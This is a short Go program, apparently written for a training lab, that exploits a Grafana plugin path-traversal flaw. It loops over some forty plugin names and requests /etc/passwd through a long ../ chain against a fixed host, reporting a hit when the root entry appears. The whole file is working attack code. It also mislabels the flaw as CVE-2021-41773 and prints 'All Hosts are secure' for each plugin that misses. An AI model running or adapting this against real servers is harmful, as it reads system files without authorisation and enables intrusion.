package main

// library to use net/http net/dialer
import (
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
)

var plugin_list []string = []string{
	"alertlist",
	"annolist",
	"barchart",
	"bargauge",
	"candlestick",
	"cloudwatch",
	"dashlist",
	"elasticsearch",
	"gauge",
	"geomap",
	"gettingstarted",
	"grafana-azure-monitor-datasource",
	"graph",
	"heatmap",
	"histogram",
	"influxdb",
	"jaeger",
	"logs",
	"loki",
	"mssql",
	"mysql",
	"news",
	"nodeGraph",
	"opentsdb",
	"piechart",
	"pluginlist",
	"postgres",
	"prometheus",
	"stackdriver",
	"stat",
	"state-timeline",
	"status-histor",
	"table",
	"table-old",
	"tempo",
	"testdata",
	"text",
	"timeseries",
	"welcome",
	"zipkin"}

func main() {
	for items := range plugin_list {
		resp, err := http.Get("http://ptl-65e706df-b512292f.libcurl.so/public/plugins/" + plugin_list[items] + "/../../../../../../../../../../../../../etc/passwd")
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		check := strings.Contains(string(body), "root:x:0:0:root:/root:/bin/bash")
		if check == true {
			fmt.Println("Host is Vulnerbale for CVE-2021-41773")
		} else {
			fmt.Println("All Hosts are secure")
		}
	}

}
